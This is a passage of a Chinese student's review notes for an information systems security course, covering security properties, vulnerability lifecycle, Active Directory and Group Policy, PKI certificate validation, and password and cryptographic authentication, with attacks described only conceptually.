着重证书验证过程</li><li>PKI的安全性</li></ol><p><strong>第4章 身份验证</strong></p><ol><li>基于文本口令认证的安全机制</li><li>基于密钥学的认证协议(能分析协议，根据需要设计协议)</li><li>基于设备的认证及其案例(RFID、扫码认证)</li><li>现实中的认证与密钥交换协议(重点kerberos)</li></ol><p>补充：AAA，对称密钥交换，HMAC，公钥(2个)，DH，Kerberos协议，NTLM</p><p><strong>第5章 访问控制</strong></p><ol><li>常见访问控制策略<ol><li>自主访问控制DAC</li><li>强制访问控制MAC(BLP，Biba，中国墙模型)特点及分析</li><li>基于角色访问控制RBAC</li><li>基于属性访问控制</li></ol></li></ol><p>补充：访问控制基本原则</p><p><strong>第6章 数据安全</strong></p><ol><li>数据存储加密<ol><li>透明加解密的实现原理、密钥管理</li></ol></li><li>系统可靠性与数据容错<ol><li>数据备份的策略、及RAID机制的几种备份机制</li><li>数据恢复机制(基于备份和非备份的)</li></ol></li><li>隐私保护技术<ol><li>匿名化基本原理和方法</li><li>差分隐私原理(加什么噪声、不同敏感度函数的使用场景)，以数据型为例进行分析</li><li>同态加密的基本思想<br />补充：多方计算，TMP，联邦学习</li></ol></li></ol><p><strong>第7章 VPN</strong></p><ol><li>VPN概述<ol><li>IPSEC VPN和TLS VPN的比较</li></ol></li></ol><h1 id="第1章-概述"><a class="markdownIt-Anchor" href="#第1章-概述"></a> 第1章 概述</h1><p>​信息系统安全是为保护信息系统资产(硬件、软件、数据、通信设施和网络)而采取的技术上和管理上的措施和控制方法，用以抵御网络环境中的相关安全风险，从而保证系统的保密性、完整性、可用性等安全属性</p><blockquote><p>1 安全属性: 机密性，保密性，完整性，可用性等是什么意思，真正的含义</p><p>2 安全威胁: 根据不同的角度去分类，了解就行</p><p>3 安全漏洞: 生命周期，对于它每一部分，安全管理人员需要做哪些工作</p><p>4 安全模型: 了解</p></blockquote><h2 id="安全属性"><a class="markdownIt-Anchor" href="#安全属性"></a> 安全属性</h2><p>CIA+其他 -9</p><ul><li><strong>保密性</strong>：解决非授权的信息泄露问题，防止对信息进行未授权的“读”。<ul><li>物理隔离，访问控制，信息加密，混淆，业务流量填充</li></ul></li><li><strong>完整性</strong>：保证数据及系统不会被非授权更改或破坏，防止或者至少检测出未授权的“写”操作。<ul><li><p>分为数据完整性和系统完整性</p><ul><li>数据完整性，确保数据存储、使用、传输过程中不会被非授权的用户篡改，同时还要防止授权用户对系统及其信息进行不恰当的破坏</li><li>系统完整性，确保系统在被授权的情况下，以未受损的方式执行预定功能，不能多，不能少</li></ul></li><li><p>预防：加密，访问控制，冗余备份</p></li><li><p>检测：数字签名，哈希计算，日志审计 --&gt; 主要是发现数据完整性是否遭到破坏，并不试图阻止破坏</p></li></ul></li><li><strong>可用性</strong>：确保授权用户或实体对信息及资源的正常使用不会被异常拒绝，对信息资源和系统服务的拒绝服务攻击属于对可用性的破坏<ul><li>访问控制机制，检测&amp;应急响应，备份与灾难恢复</li></ul></li><li><strong>可控性</strong>：对系统中的各种资源和操作进行有效的控制和管理，能够根据授权对系统进行监测和控制，记录系统状态、审计操作的合规性、溯源操作主体等<ul><li>访问控制，安全审计，路由控制，过滤</li></ul></li><li><strong>不可否认性</strong>：也称不可抵赖性，收发双方不可抵赖<ul><li>数字签名(源发证明，交付证明)，第三方认证</li></ul></li><li><strong>可认证性</strong>：又称为真实性，是指能够对信息的发送实体和接收实体的真实身份，以及信息属性的真实性进行鉴别<ul><li>身份认证，数字签名，消息认证码</li></ul></li><li><strong>可追溯性</strong>：也称可说明性、可审计性，其安全目标是实体的动作能够被唯一的追踪到。该目标是责任的完整性<ul><li>审计，防抵赖，故障隔离，入侵检测和防护</li></ul></li><li><strong>可靠性</strong>：是指系统无故障地持续运行。越可靠的系统所能持续的时间越长</li></ul><h2 id="安全威胁"><a class="markdownIt-Anchor" href="#安全威胁"></a> 安全威胁</h2><h3 id="安全威胁-3"><a class="markdownIt-Anchor" href="#安全威胁-3"></a> 安全威胁-3</h3><ol><li>信息泄露<ul><li>敏感数据在有意或无意中被泄露或丢失</li><li>包括 --&gt; 传输中，存储介质中，建立隐蔽信道窃取</li></ul></li><li>信息破坏<ul><li>以非法手段获得对数据的使用权，删除，修改，插入或重发某些信息，以取得有益于攻击者的响应信息；</li><li>恶意添加、修改数据，以干扰用户的正常使用</li></ul></li><li>拒绝服务<ul><li>执行无关程序使系统响应减慢甚至瘫痪，影响正常用户的使用，甚至使合法用户被排斥而不能得到相应的服务</li></ul></li></ol><h3 id="威胁来源-2"><a class="markdownIt-Anchor" href="#威胁来源-2"></a> 威胁来源-2</h3><ul><li>自然因素<ul><li>包括各种自然灾害、系统环境和场地、电磁干扰、设备老化等</li></ul></li><li>人为因素<ul><li>有意和无意之分；无意，操作、设计失误等；有意，恶意攻击等</li></ul></li></ul><h2 id="安全漏洞"><a class="markdownIt-Anchor" href="#安全漏洞"></a> 安全漏洞</h2><h3 id="生命周期"><a class="markdownIt-Anchor" href="#生命周期"></a> 生命周期</h3><ol><li>漏洞发现：<ul><li>即通过人工或自动的方法分析、挖掘漏洞的过程。</li><li>从漏洞产生到被测试人员发现的阶段被称为“0-day”，在确认是安全漏洞后，要为该漏洞开发概念验证性的渗透攻击代码(POC, proof of concept)以及确认可利用性。</li></ul></li><li>漏洞利用：<ul><li>从漏洞被发现到官方发布修补方法的过程被称为“1-day”。</li><li>在发现安全漏洞并给出渗透攻击代码后，负责任的发现者会首先通知厂商进行修补，等厂商给出补丁后再进行公布。</li></ul></li><li>漏洞修复<ul><li>通过补丁、升级版本或配置策略等对漏洞进行修补的过程，使得该漏洞不能够被恶意主体所利用。</li><li>同时，漏洞管理部门通过网站、邮件列表等渠道将漏洞信息向社会或受影响的用户发布，随着用户逐渐地安装补丁和新的漏洞的产生，该漏洞的危害也就变得越来越小，并逐渐走向消亡。</li></ul></li></ol><h2 id="安全模型"><a class="markdownIt-Anchor" href="#安全模型"></a> 安全模型</h2><h3 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h3><ul><li>系统安全动态模型：纵向</li><li>系统安全层次模型：核心</li><li>系统安全综合模型：横向</li></ul><h3 id="系统安全动态模型纵向"><a class="markdownIt-Anchor" href="#系统安全动态模型纵向"></a> 系统安全动态模型:纵向</h3><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>P</mi><mn>2</mn></msup><mi>D</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">P^2DR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span>模型 --&gt; 策略(Policy)，保护(Protection)，检测(Detection)，响应(Response)</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>D</mi><mi>R</mi><mi>R</mi></mrow><annotation encoding="application/x-tex">PDRR</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span>模型 --&gt; 防护(Protection)，检测(Detection)，响应(Response)，恢复(Recovery)</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi><mi>P</mi><mi>D</mi><mi>R</mi><mi>R</mi><mi>C</mi></mrow><annotation encoding="application/x-tex">WPDRRC</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>模型 --&gt; 在PDRR模型的前后增加了预警(Warning)和反击(Counterattack)</li></ul><h3 id="系统安全层次模型核心"><a class="markdownIt-Anchor" href="#系统安全层次模型核心"></a> 系统安全层次模型:核心</h3><p>分层防御</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401061607969.png" alt="image-20240106160741830" /></p><h1 id="第2章-安全管理"><a class="markdownIt-Anchor" href="#第2章-安全管理"></a> 第2章 安全管理</h1><blockquote><p>1 掌握PDCA的过程: 每个阶段做什么工作</p><p>2 信息安全标准: 了解一下，特别是评测标准</p><p>3 活动目录设计及关键机制: 数据结构X.500(访问协议是LDAP身份认证)，命名解析(扁平形和竖型–&gt;DNS)，认证(单点登录-&gt;kerberos协议)，逻辑管理组件(组织单元，域，域树，域森林等)，物理组件(站点-&gt;和目录设计无关，只是物理结构体现)</p><p>4 组策略: 策略上实施的目标，策略上冲突检测怎么做(纵向看优先级，横向即用户策略发生冲突)</p><p>分A/B卷，这一块只有一张卷子上考(maybe)</p></blockquote><h2 id="pdca"><a class="markdownIt-Anchor" href="#pdca"></a> PDCA</h2><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401051104895.png" alt="image-20240105110442850" /></p><p>计划(Plan)：建立与组织的总体战略、目标和方针保持一致的信息安全管理方针和策略，通过风险评估来建立控制目标和方式，<strong>制定风险处理计划</strong>。</p><p>执行(Do)：按照控制目标和方式实施信息安全管理，<strong>开展全员安全培训、实施安全控制</strong>。</p><p>检查(Check)：对照信息安全管理体系的目标和方针，对信息安全管理进行监视和验证，<strong>评审ISMS的有效性和适当性</strong>。</p><p>处理(Act)：基于上述对体系的内部审核和管理评价的结果，采取<strong>纠正和预防</strong>措施，以<strong>持续改进组织的信息安全管理体系</strong>。</p><h2 id="信息安全标准"><a class="markdownIt-Anchor" href="#信息安全标准"></a> 信息安全标准</h2><p><strong>信息安全评测国际标准</strong>：TCSEC，CC，ISO/IEC 15408</p><ul><li>[2.1.pdf](file://E:/Data/大学/大三/大三上/信息系统安全/信息系统安全ppt/2.1.pdf)</li></ul><h2 id="活动目录"><a class="markdownIt-Anchor" href="#活动目录"></a> 活动目录</h2><h3 id="基础概念"><a class="markdownIt-Anchor" href="#基础概念"></a> 基础概念</h3><p>活动目录(Active Directory, AD)：域环境中提供目录服务的组件。</p><p><strong>特点</strong>：</p><ul><li>活动目录不仅<strong>存储网络对象的信息</strong>，还<strong>提供目录服务</strong>，使用者能快速准确查找目录中的信息，而不需要考虑搜索对象的地理位置。</li><li>活动目录提供了完全集成在Windows中的一个分层目录服务。为企业提供了网络环境中集中式管理制。</li><li>这种分层的目录结构，简化了一般的管理任务，可以使企业网络具有极强的可扩展性。</li></ul><h3 id="机制"><a class="markdownIt-Anchor" href="#机制"></a> 机制</h3><p>-&gt; 完成单域及多域环境下活动目录管理功能的机制</p><h4 id="单点登录"><a class="markdownIt-Anchor" href="#单点登录"></a> 单点登录</h4><p>单点登录(Single Sign On, SSO)：用户只需要登录一次就可以访问所有相互信任的应用系统。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401061626225.png" alt="image-20240106162658095" /></p><ul><li>认证：Kerberos。单点登录就是活动目录的认证，上图的sso基于kerberos协议，这里主要考察kerberos协议的认证</li><li>同时也有基于其他协议实现的SSO，如SPNEGO SSO、CAS SSO</li><li>kerberos协议：一种计算机网络认证协议，它允许某安全实体在非安全网络环境下通信，向另一个实体以一种安全的方式证明身份。</li></ul><h4 id="其余"><a class="markdownIt-Anchor" href="#其余"></a> 其余</h4><p><strong>全局目录</strong></p><p>​全局编录/全局目录(Global Catalog, GC)：保存在一个或多个域控制器中的数据库(只读副本，存储对象属性集的)。记录了 AD 中所有域对象的部分信息，架构信息和配置信息的完整副本。</p><p>全局目录的任务：</p><ul><li>登录：向域控制器提供通用组成员信息。<strong>用户登录网络时，必须存在一台全局编录服务器，否则只能登录到本地</strong>，例外是“域管理组中的成员”。</li><li>查询：使得客户机能够方便快捷地<strong>执行跨所有域的搜索</strong>，而不必逐个搜索每个域。只有当查询对象信息不在GC中时，服务器才会将查询转至对象所在域。</li></ul><p><strong>多主复制</strong></p><p>​多主复制(Multi-master replication)：通过安装域控制器，就可以在整个网络环境中创建目录的多份副本。网络中任何地方发生的变化都会在整个网络中自动复制。</p><p><strong>组策略</strong></p><p>在下面单独陈述</p><p><strong>命名解析</strong>：将对象的名称转化为其对应的网络地址或其他标识的过程</p><p>​扁平型</p><p>​竖型：DNS</p><p><strong>逻辑管理组件</strong>(组织单元，域，域树，域森林等)</p><ul><li>组织单元：可连接组策略，是委派管理权限的最小分组</li><li>域：一个有安全边界的计算机、用户的集合</li><li>域树：具有连续命名空间的多个域称为树</li><li>域森林：不构成连续命令空间的域树的集合</li></ul><p><strong>物理组件</strong>(站点-&gt;和目录设计无关，只是物理结构体现)</p><h2 id="组策略"><a class="markdownIt-Anchor" href="#组策略"></a> 组策略</h2><h3 id="概念-2"><a class="markdownIt-Anchor" href="#概念-2"></a> 概念</h3><p>​组策略(Group Policy, GP)：<strong>在初始化时应用于计算机或用户的配置设置</strong>。可在不同层次上定义控制规则。</p><p>​组策略是<strong>管理员针对于网络中的用户和计算机所作的一系列设置</strong>，可以设置在站点、域、组织单元(如果是工作组计算机则设置在本机上)，使管理员可以集中控制程序，网络资源及系统行为。</p><h3 id="设置对象"><a class="markdownIt-Anchor" href="#设置对象"></a> 设置对象</h3><p>​在域中，可以对站点、域、组织单元设置组策略。可将一个组策略链接到多个Site/Domain/OU，也可以将多个组策略链接到同一Site/Domain/OU。</p><p>​在工作组中，使用本地组策略对计算机进行设置。</p><h3 id="纵向处理"><a class="markdownIt-Anchor" href="#纵向处理"></a> 纵向处理</h3><ul><li><strong>处理顺序(默认处理)：</strong><ol><li>本地策略对象</li><li>链接在站点上的GPO对象(组策略对象)</li><li>链接在域上的GPO对象(组策略对象)</li><li>连接在OU(组织单元)上的GPO对象(组策略对象)</li></ol></li></ul><p>在OU组策略对象中仍会细分，处理顺序依次是：</p><p>最高级OU的GPO—&gt;子级OU的GPO—&gt;最低级OU的GPO</p><ul><li><strong>处理注意点：</strong><ul><li>排在处理顺序后面的GPO，<strong>拥有最高的优先级</strong></li><li>工作组成员只处理本地组策略对象</li></ul></li><li><strong>例外处理:</strong><ul><li>禁止替代，No Override：防止随后处理的GPO覆盖该GPO，当多个GPO均设置为“禁止替代”时，优先采用先处理的GPO。(对后面的GPO：必须、只能用我，我是当继承链的结尾)</li><li>阻止策略继承，Block Policy Inheritance：禁止该GPO继承父组策略(对前面的GPO：我不想用你，我想当继承链的新开头)。<strong>权限小于“禁止替代”</strong>。</li></ul></li></ul><h3 id="横向处理"><a class="markdownIt-Anchor" href="#横向处理"></a> 横向处理</h3><p>用户和计算机拥有不同的组策略。</p><p>默认处理顺序：</p><ol><li>计算机策略</li><li>用户策略</li></ol><p>Lookback环回选项(环回处理)：(让计算机策略更牛逼的选项)</p><ul><li>Replace替换模式：只用计算机策略。在系统启动时计算机所在容器的GPO列表完全替代用户所在容器的GPO策略列表</li><li>Merge合并模式：先用户策略、再计算机策略(计算机策略的优先级更高了)。计算机容器的GPO列表添加到用户容器的GPO用户策略列表之后，所以，有冲突的话，计算机容器的策略权限具有更高的优先权</li></ul><h2 id="其余-2"><a class="markdownIt-Anchor" href="#其余-2"></a> 其余</h2><ol><li><p>GPO对象的处理顺序(应用顺序也是处理顺序吗？)是什么，是策略生效顺序吗，如果是策略生效，那么先本地组策略，再站点，域，组织单元的顺序是不是后面替代前面的—&gt;感觉这样也对应了后面的GPO的优先级高的陈述，因为优先级高，所以它先作用</p><ul><li>计算机和用户是仅有的接收组策略的活动目录对象类型</li></ul></li><li><p>对于域用户的区分</p><ul><li>使用cmd输入 whoami，输出 A\B，前面的是计算机名，后面是用户名，可以通过这个来查看目前是什么用户</li></ul></li><li><p>关于计算机策略和用户策略</p><ul><li><p>计算机策略<strong>作用于</strong>该GPO链接的站点/域/组织单元中计算机</p></li><li><p>用户策略<strong>作用于</strong>该GPO链接的站点/域/组织单元中用户</p></li><li><p>简单而言，一个组织单元(maybe)中计算机与用户的区别主要在于创建的时候的<strong>类型</strong>，创建计算机可以理解为把域中的计算机拉到自己的这个组织单元中，而创建用户就是字面意思上从零创建一个新的用户</p></li><li><p>这里需要注意，域中的计算机是 <strong>域外计算机设置加入域后而产生的</strong> ，所以计算机就是真的指的一台物理的计算机</p></li><li><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401051031051.png" alt="image-20240105103122897" />这里是活动目录(每个win server就是一个域控–&gt;这里假定每个server都是一个域，而每个域控都存储着副本的活动目录数据库)，里面有Client Users的用户，Computers的计算机</p></li></ul></li><li><p>关于活动目录</p><ul><li><p>每个域都有自己的活动目录，用于存储该域内的对象信息，例如用户、组、计算机等</p></li><li><p>而对于这个域加入林而言，会为新林添加一个<strong>新的活动目录数据库</strong>，每个域都会共享一个全局目录树和一个全局目录命名空间(全局目录)</p></li></ul></li></ol><h1 id="第3章-密钥管理基础架构"><a class="markdownIt-Anchor" href="#第3章-密钥管理基础架构"></a> 第3章 密钥管理基础架构</h1><blockquote><p>1 PKI架构: 包含的组件</p><p>2 CA建立信任: 单独，层次，网状，桥式</p><p>3 数字证书: 证书的4步验证(前两步tls就会去验证，第四步就是验证功能(通用名称，域名是否一致等))-&gt; 要知道验证的细节，知道哪一步可能会出现的问题</p><p>4 涉及对称密钥的管理，相对简单，了解一下</p></blockquote><h2 id="pki架构"><a class="markdownIt-Anchor" href="#pki架构"></a> PKI架构</h2><p>​PKI(Public Key lnfrastruicture)是一个安全基础设施，是一个包括硬件、软件、人员、策略和规程的集合(一组组件和规程)。用来实现基于公钥密码体制的密钥和证书的产生、管理、存储、分发和撤销等功能。</p><h3 id="组件"><a class="markdownIt-Anchor" href="#组件"></a> 组件</h3><p>CA、RA、LDAP、密钥备份及恢复系统、CRL、API</p><ul><li>认证机构(CA)：是公钥基础设施中的<strong>可信第三方实体</strong>，是信任的起点，<strong>向主体颁发证书，证书吊销列表CRL</strong>，续借和更新证书。有些PKI会把RA的功能融合进CA中。</li><li>注册机构(RA)：多数情况下，RA主要用于在证书登记过程中<strong>核实证书申请者的身份</strong>，有的架构中，CA也委派给RA一些其他责任，像个人认证，吊销报告、密钥生成、存储密钥对。</li><li>证书库：存储，分发证书和CRL，证书存储库可由所有终端实体和 CA 访问，主要使用目录服务LDAP和数据库。</li><li>档案库：主要任务是存储和保护充足的信息来决定一份儿旧的文档中数字签名是可信任的。</li><li>密钥备份及恢复系统：为应对用户丢失解密密钥的情况，PKI提供了备份与恢复密钥的机制。密钥备份与恢复只能针对解密密钥，签名私钥为确保其唯一性而不能够作备份。</li><li>证书吊销系统：证书在有效期内由于某些原因(如私钥泄露)可能需要废除，即将证书列入CRL。</li><li>应用接口：提供良好的应用接口，使各种应用能够与PKI交互。</li></ul><p><strong>有次测试问组成</strong>：CA，RA，资料库，OCSP服务器(提供CRL-&gt;在线证书状态协议)</p><h3 id="功能"><a class="markdownIt-Anchor" href="#功能"></a> 功能</h3><p>认证：</p><ul><li>被认证的数据－－－－－－数据源认证</li><li>用户发送的远程认证请求—身份认证</li><li>远程设备生成请求－－－－身份认证</li></ul><p>完整性：利用数字签名即可实现实体认证、也可验证数据完整性</p><p>保密性：用公钥分发秘密密钥，用秘密密钥加密数据</p><p>不可否认性：数字签名</p><h2 id="ca建立信任方式"><a class="markdownIt-Anchor" href="#ca建立信任方式"></a> CA建立信任方式</h2><p>四种(zaj说的，具体的看博客)-&gt;单独，层次，网状，桥状</p><h2 id="数字证书"><a class="markdownIt-Anchor" href="#数字证书"></a> 数字证书</h2><p>书P255</p><p>数字证书是一个经CA数字签名的包含<strong>公钥拥有者信息</strong>以及<strong>公钥</strong>的文件，还包括签名算法和用途。PKI适用于异构环境，所以证书格式必须统一，公钥证书的形式是由<strong>X.509标准</strong>制定</p><p><strong>证书的用途</strong>: 签名证书，加密证书</p><p><strong>证书的验证</strong></p><ul><li><p>证书真实性的验证基于<strong>证书链验证机制</strong>，其验证对象：</p><ol><li><p>验证真实性。是否为可信任CA认证中心签发</p></li><li><p>验证有效性。是否在证书的有效使用期之内</p></li><li><p>验证可用性。是否已废除</p></li><li><p>验证证书结构中的证书用途。</p></li></ol></li><li><p>感觉老师说的验证过程就是下图https网站时的认证过程</p></li></ul><h2 id="pki的安全性"><a class="markdownIt-Anchor" href="#pki的安全性"></a> PKI的安全性</h2><p>访问https网站时的认证过程</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401061712719.png" alt="image-20240106171251613" /></p><ul><li>针对认证过程的攻击手段：<ol><li>对证书传输过程的攻击(中间人攻击)</li><li>对CA认证过程的攻击</li><li>对CA签名过程的攻击</li><li>对算法的攻击</li><li>对用户确认的攻击</li></ol></li></ul><p>1 Hacker无法取得CA签发的证书，<a href="http://xn--example-gi4kh6czxosvfly3ar8hbi8hteuav59a5e8b.com">会创建顶层自签名证书example.com</a>，而该证书不在浏览器信任范围内(不准确)，就会导致不可信弹窗(继续前往！)。</p><p>2 Hacker无法取得CA签发的证书，<a href="http://xn--hacker-o77iz38as2wd7mns4ckdbk88fx12agln.com">直接发送自己的证书hacker.com</a>，浏览器检查不通过，终止握手协议</p><h2 id="其余-3"><a class="markdownIt-Anchor" href="#其余-3"></a> 其余</h2><h3 id="证书签发与验证"><a class="markdownIt-Anchor" href="#证书签发与验证"></a> 证书签发与验证</h3><p>数字证书是一个经CA数字签名的包含<strong>公钥拥有者</strong>信息以及<strong>公钥</strong>的文件，还包括签名算法和用途。</p><ul><li>证书签发</li></ul><ol><li>**根CA：**是整个证书体系中的最高级别的证书颁发机构。根CA的公钥被内置到系统或浏览器中，用于验证其他证书的真实性。</li><li>**下级CA：**是位于根CA之下的证书颁发机构。下级CA可以用于签署终端用户的证书，也可以进一步创建更下级的CA。这样的层次结构可以形成一个证书链。</li><li><strong>签名过程：</strong> 下级CA需要获得一个证书时，它会生成一对公钥和私钥。然后，它将其公钥与一些其他信息一起发送给上级CA，即根CA。上级CA使用自己的私钥对下级CA的公钥和相关信息进行数字签名，生成一个签名值。</li><li><strong>颁发证书：</strong> 上级CA将生成的签名值附加到下级CA的证书请求中，形成了下级CA的数字证书。这个数字证书包含了下级CA的公钥和其他相关信息，同时被上级CA的数字签名所认证。</li><li><strong>证书链：</strong> 下级CA可以使用其数字证书签署终端用户的证书，这就形成了一个证书链。终端用户的证书通过层层的签名，最终可以追溯到根CA，从而建立了信任链。</li></ol><ul><li>证书验证</li></ul><p>当 A 向 B 发送数字证书时，B 需要验证这个数字证书的真实性。这个数字证书可能是由另一个中间CA签发的，而不是由根CA直接签发。在这种情况下，验证的步骤如下：</p><ol><li><strong>获取证书：</strong> B 首先收到 A 发送的数字证书，该证书包含了 A 的公钥以及其他相关信息。</li><li><strong>提取公钥：</strong> B 从证书中提取 A 的公钥。</li><li><strong>验证签名：</strong> B 使用签发该证书的CA(可能是中间CA)的公钥来验证数字证书的签名。中间CA的公钥可以通过根CA的证书链进行验证。如果数字签名验证成功，说明证书是由中间CA签发的。</li><li><strong>检查有效期：</strong> B 检查证书的有效期，确保证书在当前时间内是有效的。</li><li><strong>检查撤销状态：</strong> B 可以查询中间CA的证书撤销列表(CRL)或使用在线证书状态协议(OCSP)来检查证书的撤销状态。如果证书已被撤销，验证失败。</li><li><strong>验证证书链：</strong> 如果证书是由中间CA签发的，B 可以继续验证证书链，确保中间CA的证书也是由更高一级的CA签发的。这个过程一直追溯到根CA的证书。<code>证书链主要是验证用于验证证书的公钥是否正确，所以不断向上，找到跟CA</code></li><li><strong>应用证书：</strong> 如果验证成功，B 可以使用 A 的公钥来加密或验证数字签名，确保与 A 进行安全的通信。</li></ol><h3 id="ca"><a class="markdownIt-Anchor" href="#ca"></a> CA</h3><ol><li>单个CA</li><li>网状结构–&gt;相互信任<ul><li>独立的CA双方交叉认证也就是互相发放证书也就是互相发放证书，结果是在对等的CA中产生了信任关系网。信任仅存在于这两个CA及其下面的子CA之间。</li></ul></li><li>桥式CA–&gt;中间得桥式CA不签名，也通常不被主体信任，只是一个中间人<ul><li>桥式PKI通过引进一个新的CA称为桥式CA称为桥式CA来连接企业之间的PKI。桥式CA惟一的目的是为企业PKI建立关系。</li></ul></li></ol><h1 id="第4章-身份验证"><a class="markdownIt-Anchor" href="#第4章-身份验证"></a> 第4章 身份验证</h1><blockquote><p>1 基于文本口令认证: 知道提供的安全机制</p><p>2 基于密码学认证协议: 给出需求设计出认证协议-&gt;对称的，非对称的，基于消息验证码的，根据提示来设计</p><p>3 基于图形和生物特征的认证: 关于身份的鉴别，了解即可</p><p>4 基于设备的认证及其案例: 理解细节 RFID，射频可以实现设备的多点认证，扫码认证是认证信息放在手机端，(微信扫码举例)存放的是已经验证好的token，码里存放的是跟设备相关的信息–&gt;手机里的信息和二维码的信息进行结合，生成一个信息对电脑设备进行认证，考身份认证过程中流转的身份信息来自于哪里，微信扫码是来自微信已经登录过的缓存的身份验证块(token)</p><p>5 掌握kerberos协议，基于对称加密的身份认证协议，可以实现单点登录，需要掌握细节</p></blockquote><p>系统安全最基本服务：AAA</p><ul><li><p>身份认证：对用户身份的证实，它能防止攻击者假冒合法用户获取访问权限</p></li><li><p>授权：当用户身份被证实后，赋予该用户进行资源访问的权限</p></li><li><p>审计：每一个用户都应该为自己所做的操作负责，所以每个操作都要留下记录，以便事后核查</p></li></ul><h2 id="基于文本口令认证的安全机制"><a class="markdownIt-Anchor" href="#基于文本口令认证的安全机制"></a> 基于文本口令认证的安全机制</h2><p>​基于口令的机制允许人们选择自己的口令，并且不需要辅助设备生成或储存，因此用户名加口令成为应用最广泛的一种身份认证方式。基于口令的认证虽然简单便捷、费用低廉，但安全性上也存在风险。</p><p><strong>口令安全</strong></p><p>(1)口令Hash散列存储 – 防离线字典，穷举攻击</p><p>(2)加盐Hash – 增加离线字典攻击难度</p><p>(3)强口令设置 – 字典，穷举</p><p>(4)密码策略</p><p><strong>利用验证码增加安全</strong></p><p>​目前抵御在线口令猜测的主要方式是使用验证码，在线口令猜测威胁主要来自专门的破解工具的自动程序猜测攻击。验证码是一种逆图灵测试。</p><p><strong>攻击手段</strong></p><ol><li>字典或穷举攻击(认证端)</li><li>社交工程窥探、垃圾收集、污迹攻击</li><li>网络数据流窃听：如果口令使用明文传输，则可被非法截获。如Telnet、FTP、POP3都使用明文口令，而攻击者只需通过窃听就能分析出口令。</li><li>截取/重放攻击：利用截获的值，攻击者可以在新的登录清求中将其提交到同一服务器，服务器不能区分这个登录谓求是来自合法用户还是攻击者。</li></ol><h2 id="基于密码学的认证协议"><a class="markdownIt-Anchor" href="#基于密码学的认证协议"></a> 基于密码学的认证协议</h2><p>​基于密码学实现的身份鉴别机制，其基本思想是一个实体向另一个实体证明他知道有关的秘密知识，但不向验证者提供秘密本身。同时，向验证者提供的消息要具有时效性。</p><h3 id="基于对称密码的验证机制"><a class="markdownIt-Anchor" href="#基于对称密码的验证机制"></a> 基于对称密码的验证机制</h3><ul><li>基于对称密码算法的鉴别机制可以没有第三方， 也可以有可信的第三方——通常称为KDC(Key Distrib-ution Center)用来进行密钥管理。<ul><li>两个人共享对称密码的密钥</li></ul></li></ul><h3 id="基于mac码的验证机制"><a class="markdownIt-Anchor" href="#基于mac码的验证机制"></a> 基于MAC码的验证机制</h3><p>​利用共享密钥来生成固定长度的数据块，称为消息认证码MAC(也称报文 鉴别码Message Authentication Code)，是最常用的对称密码技术</p><p><strong>特点:</strong></p><ol><li>固定长度</li><li>由校验算法生成：MAC=F(KAB,M)</li><li>A、B共享密钥，接受者对输入执行同方向计算，检查生成的MAC是否与接受的MAC匹配</li><li>提供<strong>数据完整性</strong>、<strong>数据源认证</strong>两种服务</li></ol><p>算法输入秘密密钥和特定数据，算法设计上是不可逆的</p><ol><li>通信双方共享秘密密钥。接收者对特定输入数据执行相同方向的计算，并检查它是否与收到的MAC匹配。</li><li>确保数据来自声称的发送者且传输过程没有被篡改。</li></ol><p><strong>生成方法</strong>主要是分组密码和利用散列函数的消息认证技术(HMAC-&gt;Hmac本质上就是把key混入摘要的算法)</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401080837495.png" alt="image-20240108083700317" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202401071653108.png" alt="image-20240107165331053" /></p><h3 id="基于非对称密码的认证机制"><a class="markdownIt-Anchor" href="#基于非对称密码的认证机制"></a> 基于非对称密码的认证机制</h3><ul><li>公钥加密</li><li>私钥加密</li><li>私钥-公钥加密</li></ul><p><strong>功能特点</strong></p><p>公钥加密：仅提供保密性，不能进行认证</p><p>私钥签名：可提供消息认证的三种安全服务(完整性，认证性，抗抵赖性)</p><p>先私钥后公钥：保密性、消息认证的所有三种服务。</p><h3 id="现实中的认证与密钥交换协议"><a class="markdownIt-Anchor" href="#现实中的认证与密钥交换协议"></a> 